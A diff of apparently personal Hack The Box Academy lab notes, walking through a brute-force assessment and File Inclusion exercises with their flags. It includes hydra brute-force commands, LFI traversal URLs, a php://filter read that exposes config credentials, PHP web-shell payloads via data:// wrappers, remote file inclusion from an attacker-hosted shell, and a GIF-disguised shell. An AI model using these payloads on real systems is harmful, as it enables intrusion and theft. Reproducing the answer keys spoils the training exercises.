@@ -6500,10 +6500,46 @@ This is the second part of the skills assessment. `YOU NEED TO COMPLETE THE FIR
 What is the username of the ftp user you find via brute-forcing?
 
 ```
-sudo nmap -sV -sC $ip -Pn -p-
+sudo nmap -sC -sV -Pn 83.136.253.73 -p 53002  
+# output: 53002/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
 
+# Now we brute force ssh service with hydra
+hydra -l satwossh -P passwords.txt -f 83.136.253.73  -s 53002  ssh
+# Output: [53002][ssh] host: 83.136.253.73   login: satwossh   password: password1
+
+# We access the service with creds: satwossh:password1
+ssh satwossh@83.136.253.73 -p 53002 
+
+# We see the content of our home folder and read the IncidentReport.txt:
+ls
+cat IncidentReport.txt
+# We obtain an interesting name: "Thomas Smith". 
+
+# We enumerate open services: 
+nmap localhost
+# Output: open ports: 21 and 22.
+
+# We will use username-anarchy to generate a list of potential users:
+echo "Thomas Smith" > realnames.txt
+./username-anarchy -i realnames.txt
+# we save the output under ~/namelist.txt
+
+# We launch hydra
+hydra -L namelist.txt -P passwords.txt -f 127.0.0.1 ftp
+# output: [21][ftp] host: 127.0.0.1   login: thomas   password: chocolate!
+
+# We access ftp
+ftp thomas@127.0.0.1
+# enter password when prompted: chocolate!
+
+# Now, we browse and extract the flag.txt
+dir 
+get flag.txt
+quit
+cat flag.txt
 ```
 
+Results: HTB{brut3f0rc1ng_succ3ssful}
 
 What is the flag contained within flag.txt
 
@@ -6929,6 +6965,129 @@ Results:  HTB{cr055_5173_5cr1p71n6_n1nj4}
 
 
 ## [File Inclusion](https://academy.hackthebox.com/module/details/23)
+
+### File Disclosure
+
+**Using the file inclusion find the name of a user on the system that starts with "b".**
+
+```
+# Access the webapp and craft the url to:
+http://94.237.59.180:37333/index.php?language=../../../../etc/passwd
+
+# You will see the user barry
+```
+
+Results: barry
+
+ Submit the contents of the flag.txt file located in the /usr/share/flags directory.
+ 
+```
+# Access the webapp and craft the url to:
+http://94.237.59.180:37333/index.php?language=../../../..//usr/share/flags/flag.txt
+```
+
+Results: HTB{n3v3r_tru$t_u$3r_!nput} 
+
+
+ **The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt**
+
+
+```
+http://94.237.56.125:54223/index.php?language=languages/....//....//....//....//flag.txt
+```
+
+Results:  `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`
+
+
+**Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer**
+
+```
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.54.116:34705/FUZZ.php
+
+http://94.237.54.116:34705/index.php?language=php://filter/read=convert.base64-encode/resource=configure
+
+# Now we decode the output:
+echo -n "PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7" | base64 -d
+```
+
+Output:
+
+```php
+<?php
+
+if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
+  header('HTTP/1.0 403 Forbidden', TRUE, 403);
+  die(header('location: /index.php'));
+}
+
+$config = array(
+  'DB_HOST' => 'db.inlanefreight.local',
+  'DB_USERNAME' => 'root',
+  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
+  'DB_DATABASE' => 'blogdb'
+);
+
+$API_KEY = "Awew242GDshrf46+35/k"; 
+```
+
+
+Results:  `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`
+
+
+### Remote Code Execution
+
+**Try to gain RCE using one of the PHP wrappers and read the flag at /**
+
+```
+http://94.237.54.42:31967/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/
+
+http://94.237.54.42:31967/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt
+```
+
+Results: `HTB{d!$46l3_r3m0t3_url_!nclud3}`
+
+
+**Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /**
+
+```
+# In kali attacking machine:
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# We will serve this shell from our attacking machine:
+ sudo python3 -m http.server 444
+
+# Now, from the vulnerable webapp
+http://10.129.128.202/index.php?language=http://10.10.15.90:444/shell.php&cmd=id
+
+# After browsing around:
+http://10.129.128.202/index.php?language=http://10.10.15.90:444/shell.php&cmd=cat+/exercise/flag.txt
+
+```
+
+Results: 99a8fc05f033f2fc0cf9a6f9826f83f4
+
+
+**Use any of the techniques covered in this section to gain RCE and read the flag at /**
+
+```
+# Crafting Malicious Image:
+ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+# We identify where this file was uploaded: `/profile_images/shell.gif`
+
+# And now we can trigger the remote code execution from the vulnerable endpoint within the app. After browsing around we can see that the flag is:
+http://94.237.59.180:49225/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt
+# Note. All the output is preceded by the `GIF8`string
+```
+
+Results: HTB{upl04d+lf!+3x3cut3=rc3}
+
+
+### Automation and Prevention
+
+
+### Skills Assessment
+
 
 
 ## [File Upload Attacks](https://academy.hackthebox.com/module/details/136)
